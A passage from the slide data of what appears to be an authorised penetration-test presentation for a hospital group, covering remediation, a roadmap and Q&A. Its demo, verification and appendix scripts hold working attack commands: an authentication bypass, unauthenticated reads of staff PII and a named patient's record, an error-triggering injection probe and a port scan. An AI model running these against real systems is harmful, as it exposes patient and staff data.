 foot:'<b>Total: roughly two developer-weeks.</b> Items 4, 5 and 8 are hours, not days.'},

{type:'table', sec:'REMEDIATION', kick:'OPS-OWNED', tone:'info',
 title:'Configuration changes — for the infrastructure team',
 small:true,
 head:['#','Fix','Findings closed','Effort'],
 rows:[
  ['1','Delete or correct the <code>online.narayanagroup.co.in</code> DNS record','010','<b>2 minutes</b>'],
  ['2','Enable Cloudflare WAF, bot protection and rate limiting','All (mitigation)','<b>30 minutes</b>'],
  ['3','Turn off detailed errors (<code>customErrors On</code>, <code>IncludeErrorDetailPolicy.Never</code>)','005','<b>15 minutes</b>'],
  ['4','Add the six standard security headers site-wide','009','<b>1 hour</b>'],
  ['5','Mark all cookies HttpOnly + Secure + SameSite','009','<b>1 hour</b>'],
  ['6','Force HTTPS everywhere; add HSTS','007, 008','<b>2 hours</b>'],
  ['7','Publish SPF and DMARC records','010','<b>30 minutes</b>'],
  ['8','Fix the PACS HSTS header and placeholder CORS value','008','<b>30 minutes</b>'],
  ['9','Move <code>nNote.apk</code> to HTTPS and sign it','007','<b>1 day</b>'],
  ['10','Assign owners to <code>nmc</code>, <code>uat</code>, <code>online</code> — or remove them','010','<b>1 hour</b>']],
 foot:'<b>Six of these ten take under an hour.</b> There is no reason for any of them to still '
   + 'be open at the end of this week.'},

{type:'term', sec:'REMEDIATION', kick:'VERIFICATION', tone:'info',
 title:'How to prove the fix actually worked',
 sub:'Re-run the exact attack commands. Every one of them must now fail. '
   + 'Book the re-test before you close the ticket.',
 win:'verification.sh — run after remediation',
 cls:'cyan',
 code:
`#!/bin/bash
# Re-run the attack. Everything should FAIL.

echo "[1] Auth bypass"
curl -s -o /dev/null -w "  layout.html  -> %{http_code}\\n" \\
  ".../Nnote/layout.html?empid=MzMzNDAyNA=="
#  MUST BE 401 or 403  (was 200)

echo "[2] Staff data"
curl -s -o /dev/null -w "  User/Info    -> %{http_code}\\n" \\
  ".../NtraktApi/api/User/Info/3334024"
#  MUST BE 401 or 403  (was 200)

echo "[3] Patient data"
curl -s -o /dev/null -w "  Patient/Info -> %{http_code}\\n" \\
  ".../NnoteApi/api/Patient/Info/1005411787"
#  MUST BE 401 or 403  (was 200)

echo "[4] Error leakage"
curl -s ".../NtraktApi/api/User/Info/1'" | grep -c "ORA-"
#  MUST BE 0  (was present)

echo "[5] Cookies"
curl -s -I ".../NHIS/" | grep -i "set-cookie" | grep -ci "secure"
#  MUST BE >= 1  (was 0)

echo "[6] SPF / DMARC"
dig +short TXT narayanagroup.co.in | grep -c "v=spf1"
#  MUST BE 1  (was 0)`,
 foot:'<b>Around a third of first-fix attempts are incomplete.</b> Verify with the attack, not '
   + 'with a code review. I am happy to re-test and confirm each item in writing.'},

{type:'table', sec:'REMEDIATION', kick:'ROADMAP', tone:'info',
 title:'90-day roadmap',
 small:true,
 head:['When','What','Owner','Exit criteria'],
 rows:[
  ['<b>Today</b>','Auth on both APIs · fix <code>online</code> DNS · turn off detailed errors · '
   + 'enable Cloudflare WAF · IP allow-list the APIs','Lead dev + IT head',
   'Attack commands 1-3 return 401/403'],
  ['<b>This week</b>','PIN-change protection · upload hardening · payment amounts server-side · '
   + 'APK to HTTPS · HTTPS redirect everywhere','Developers',
   'All 5 High findings closed'],
  ['<b>This month</b>','Helpdesk upgrade · legacy system decisions · PACS hardening · SPF/DMARC · '
   + 'security headers · cookie flags','IT head + vendors',
   'All 10 findings closed'],
  ['<b>Days 30-60</b>','SIEM alerts built · API inventory · patient-record access logging · '
   + 'named owner for every system','Security team',
   'All 10 alerts firing in the SIEM'],
  ['<b>Days 60-90</b>','Monthly patching routine · quarterly DNS review · incident response plan · '
   + 'internal network assessment','IT head',
   'Process in place, re-test passed']],
 foot:'<b>Book the re-test now.</b> Do not declare these closed until the attack commands fail.'},

/* ============================ 10 RUNBOOK ================================= */
{type:'divider', sec:'RUNBOOK', num:'11', kick:'LIVE DEMO RUNBOOK', tone:'info',
 title:'The live demo',
 sub:'Everything needed to run the demonstration on stage, in order, with the expected result '
   + 'for each step — and a fallback if the network fails.'},

{type:'term', sec:'RUNBOOK', kick:'DEMO SCRIPT', tone:'info',
 title:'Run these in order — total runtime about 6 minutes',
 sub:'Practice once beforehand. Have the expected result in your head so you can narrate confidently.',
 win:'demo.sh — run live on stage',
 cls:'cyan',
 code:
`#!/bin/bash\nT="https://narayanagroup.co.in"\nsay(){ echo ">>> $1"; read -p "[enter]"; }\n\nsay "1. Login issues a session? (expect: nothing)"\ncurl -s -i "$T/Nnote/index.html" | grep -i set-cookie\nsay "2. Is the ID encrypted? (expect: MzMzNDAyNA==)"\necho -n "3334024" | base64\nsay "3. Skip the login. (expect: 200)"\ncurl -s -o /dev/null -w "%{http_code}\\n" \\\n  "$T/Nnote/layout.html?empid=MzMzNDAyNA=="\nsay "4. Staff list, no login. (expect: 3 names)"\ncurl -s "$T/NnoteApi/api/Nnote/Assignee/1"\nsay "5. Full employee record. (expect: PII + photo)"\ncurl -s "$T/NtraktApi/api/User/Info/3334024" | head -c 900\nsay "6. Patient record. (expect: name, age, mobile)"\ncurl -s "$T/NnoteApi/api/Patient/Info/1005411787"\nsay "7. Clinical test for that patient."\ncurl -s "$T/NnoteApi/api/Investigation/Cancel/Bill/"\\\n         "1005411787/202310090822/202310160001"\nsay "8. Error leakage. (expect: ORA-01722 + file path)"\ncurl -s "$T/NtraktApi/api/User/Info/1'" | head -c 600\nsay "9. Email forgery possible? (expect: empty)"\ndig +short TXT narayanagroup.co.in\nsay "10. The DNS typo. (expect: 15.241.194.25)"\ndig +short online.narayanagroup.co.in`,
 foot:'<b>Presenter tip:</b> keep the terminal font large (18pt+) and pause after step 3. '
   + 'The "200" is the moment the room goes quiet.'},

{type:'bullets', sec:'RUNBOOK', kick:'CONTINGENCY', tone:'info',
 title:'If the network fails on stage',
 sub:'It happens. Be ready.',
 steps:true,
 items:[
   '<b>Have screenshots ready.</b> Before the talk, run every command and save the output as PNG files '
   + 'in presentation order. Name them <code>01.png</code> … <code>10.png</code> so you can flip through them.',
   '<b>Keep the captured output in the deck.</b> Every terminal slide in this presentation is the real, '
   + 'verbatim output. If the network dies, present from the slides — nothing is lost.',
   '<b>Test the connection 15 minutes before.</b> Run step 3 of the script. If it does not return 200, '
   + 'go straight to the slide deck.',
   '<b>Have a phone hotspot as backup.</b> The commands are tiny; mobile data is enough.',
   '<b>Kill switch:</b> if anything behaves unexpectedly, stop. Say "that is unexpected — I will verify '
   + 'offline and report back." Never improvise against production.',
   '<b>Never run a write operation on stage.</b> No uploads, no PIN changes, no bill approvals. '
   + 'Read-only demonstrations only — everything in the script above is read-only.'],
 footTone:'amber',
 foot:'<b>Non-negotiable rule for the demo:</b> read-only. GET requests only. Do not POST anything '
   + 'that changes state, on stage or off. That is what keeps this authorised and safe.'},

/* ============================ 11 Q&A ===================================== */
{type:'divider', sec:'Q&A', num:'12', kick:'QUESTIONS', tone:'info',
 title:'Questions they will ask',
 sub:'Prepared answers to the hard ones. Rehearse these.'},

{type:'table', sec:'Q&A', kick:'Q&A PREP', tone:'info',
 title:'The eight questions you will get',
 small:true,
 head:['Question','Answer'],
 rows:[
  ['<b>"Has this already been exploited?"</b>',
   'We cannot know — because there is no logging. That is itself the finding. '
   + 'Recommendation: review web server logs for unusual request volumes to these endpoints, '
   + 'and take advice on whether DPDP notification is required.'],
  ['<b>"Why did our existing security tools not catch this?"</b>',
   'Most scanners only test pages, not APIs. These vulnerabilities are in the API layer, which '
   + 'was never inventoried. Also: the WAF is available on Cloudflare but not enabled.'],
  ['<b>"Is this legal to show us?"</b>',
   'Yes. The assessment was authorised in writing by the owner, was non-destructive, and no data '
   + 'was retained. Showing you your own systems so you can fix them is the entire point.'],
  ['<b>"How much will this cost to fix?"</b>',
   'Roughly two developer-weeks of code changes, plus about a day of configuration work. '
   + 'Six of the ten ops fixes take under an hour each. Compare that with a DPDP penalty of '
   + 'up to Rs 250 crore.'],
  ['<b>"Who is to blame?"</b>',
   'Nobody in this room. These systems were built years ago by different vendors, at a time when '
   + 'hospital software was not expected to be reachable from the internet. The point is to fix '
   + 'them now that we know.'],
  ['<b>"Can we just put a WAF in front of it?"</b>',
   'Do it today, but it is a seatbelt, not a cure. It raises the cost of attack. It does not fix '
   + 'the missing authentication, and it will not stop a determined attacker.'],
  ['<b>"Which vendor built this?"</b>',
   'Multiple vendors across different years: osTicket for the helpdesk, Medsynapse for PACS, and '
   + 'in-house or contracted work for the /Nnote/ and /ncare/ stack. Go to each vendor with the '
   + 'specific finding that concerns their product.'],
  ['<b>"What is the single most important thing?"</b>',
   'Server-side authentication on the two APIs. It closes both Critical findings and the upload '
   + 'path. One day of work.']],
 foot:'<b>If you get a question you cannot answer:</b> say "I do not want to guess — I will verify '
   + 'and come back to you in writing." That is a stronger answer than a guess.'},

{type:'bullets', sec:'Q&A', kick:'THE OPEN INCIDENT', tone:'bad',
 title:'Treat this as an open incident until proven otherwise',
 sub:'This is the most important takeaway for the security team.',
 steps:true,
 items:[
   'Because there is <b>no authentication logging and no data-access logging</b>, it is impossible '
   + 'to say whether someone else has already done what I did today.',
   '<b>Assume it may have happened</b> and work backwards. Check web server logs for high-volume '
   + 'or unusual patterns against <code>/NtraktApi/</code> and <code>/NnoteApi/</code>.',
   '<b>Close the door first, investigate second.</b> Authentication before forensics — you can '
   + 'investigate once the bleeding has stopped.',
   '<b>Take advice on DPDP Act 2023 notification.</b> Early, voluntary action is viewed very '
   + 'differently from disclosure after a breach becomes public.',
   '<b>Preserve what logs you have now</b>, before rotation. Anything older than your retention '
   + 'window may already be gone.',
   '<b>Write the incident down.</b> Date found, date fixed, what data was reachable, who was told. '
   + 'You will need this record later.'],
 footTone:'red',
 foot:'<b>Do not let this become a scheduled maintenance item.</b> Two Critical findings on '
   + 'live health data is an incident.'},

{type:'title', sec:'CLOSE', kick:'THANK YOU', tone:'info',
 title:'Questions?',
 sub:'Ten findings. Two Critical. One fix that closes three of them.<br>'
   + '<b>The door is open right now. Let us close it this week.</b>',
 meta:[['REPORT','NSS-2026-NG-001'],['FINDINGS','10 (2 Critical)'],
       ['NEXT STEP','Fix auth on both APIs'],['RE-TEST','On request']]},

/* ============================ 12 APPENDIX ================================ */
{type:'term', sec:'APPENDIX', kick:'APPENDIX A', tone:'info',
 title:'Complete command reference',
 sub:'Every command used during the assessment, in one place. Hand this to your developers.',
 win:'appendix — full command set',
 cls:'dim',
 code:
`# Reconnaissance\ncurl -s "https://api.hackertarget.com/hostsearch/?q=narayanagroup.co.in"\ndig +short TXT narayanagroup.co.in\ndig +short TXT _dmarc.narayanagroup.co.in\ndig +short online.narayanagroup.co.in\nnmap -Pn -T4 -p 21,22,80,443,1433,1521,3306,3389,8080 115.241.194.4\n# Authentication bypass\ncurl -s -i "$T/Nnote/index.html" | grep -i set-cookie\ncurl -s -o /dev/null -w "%{http_code}\\n" \\\n  "$T/Nnote/layout.html?empid=MzMzNDAyNA=="\necho -n "3334024" | base64\n# Staff PII\ncurl -s "$T/NnoteApi/api/Nnote/Assignee/1"\ncurl -s "$T/NtraktApi/api/CheckOperator/3334024"\ncurl -s "$T/NtraktApi/api/User/Info/3334024"\ncurl -s "$T/NnoteApi/api/Nnote/User/Info/3334024"\n# Patient PHI\ncurl -s "$T/NnoteApi/api/Investigation/Cancel/Approval/List"\ncurl -s "$T/NnoteApi/api/Patient/Info/1005411787"\ncurl -s "$T/NnoteApi/api/Investigation/Cancel/Bill/"\\\n         "1005411787/202310090822/202310160001"\n# Error leakage\ncurl -s "$T/NtraktApi/api/Attendance/Current/4029038"\ncurl -s "$T/NtraktApi/api/User/Info/1'"\n# Versions\ncurl -s -I "http://helpdesk.narayanagroup.co.in/helpdesk/"\ncurl -s -I "https://pacs.narayanagroup.co.in/"\ncurl -s -I -L "https://uat.narayanagroup.co.in/"`},

{type:'table', sec:'APPENDIX', kick:'APPENDIX B', tone:'info',
 title:'Findings index',
 small:true,
 head:['ID','Severity','CVSS','One-line summary','OWASP 2021'],
 rows:[
  ['WEB-2026-001','<span style="color:#ff2d55"><b>Critical</b></span>','9.8','No real login; anyone can open the dashboard and reset any PIN','A07 Auth Failures'],
  ['WEB-2026-002','<span style="color:#ff2d55"><b>Critical</b></span>','9.8','Staff PII + photos and patient PHI readable with no login','A01 Broken Access Control'],
  ['WEB-2026-003','<span style="color:#ff8c1a"><b>High</b></span>','8.6','Unauthenticated file upload, caller controls the filename','A01 Broken Access Control'],
  ['WEB-2026-004','<span style="color:#ff8c1a"><b>High</b></span>','8.2','Amount and bank account stored in the payer\'s browser','A04 Insecure Design'],
  ['WEB-2026-005','<span style="color:#ff8c1a"><b>High</b></span>','7.5','Oracle errors and stack traces leaked to the public','A05 Misconfiguration'],
  ['WEB-2026-006','<span style="color:#ff8c1a"><b>High</b></span>','8.1','PHP 5.6, Apache 2.4.23, osTicket 2016, ASP.NET 2.0 — all EOL','A06 Outdated Components'],
  ['WEB-2026-007','<span style="color:#ff8c1a"><b>High</b></span>','7.5','APK and two login pages served over unencrypted HTTP','A02 Crypto Failures'],
  ['WEB-2026-008','<span style="color:#ffb020"><b>Medium</b></span>','6.5','PACS: HSTS disabled, placeholder CORS, exposed APIs','A05 Misconfiguration'],
  ['WEB-2026-010','<span style="color:#ffb020"><b>Medium</b></span>','6.5','No SPF/DMARC; online subdomain points at a stranger','A05 Misconfiguration'],
  ['WEB-2026-009','<span style="color:#ffb020"><b>Medium</b></span>','5.8','Missing headers, insecure cookies, internal IPs exposed','A05 Misconfiguration']]},

{type:'bullets', sec:'APPENDIX', kick:'APPENDIX C', tone:'info',
 title:'What to do on Monday morning',
 sub:'Literally the first four things, in order.',
 steps:true,
 items:[
   '<b>1. Send this deck and the PDF report to your IT head and lead developer today.</b> '
   + 'Do not wait for a meeting.',
   '<b>2. Fix the <code>online.narayanagroup.co.in</code> DNS record.</b> Two minutes, in Cloudflare. '
   + 'It is pointing at a stranger\'s server right now.',
   '<b>3. Turn on the Cloudflare WAF and rate limiting.</b> Free, thirty minutes, and it blunts '
   + 'everything in this deck while the real fixes are built.',
   '<b>4. Brief the developers on the one change that matters:</b> server-side authentication '
   + 'across <code>/NtraktApi/api/*</code> and <code>/NnoteApi/api/*</code>, deny by default.',
   '<b>Then book the re-test.</b> Do not close any of these tickets until the attack commands fail.'],
 footTone:'cyan',
 foot:'Full written report: <b>Narayana-Group-Website-Security-Assessment-Client-Report.pdf</b> '
   + '(42 pages, written for a non-technical reader). Individual developer-ready findings: '
   + '<b>engagement/04-findings/WEB-2026-*.md</b>.'}

];
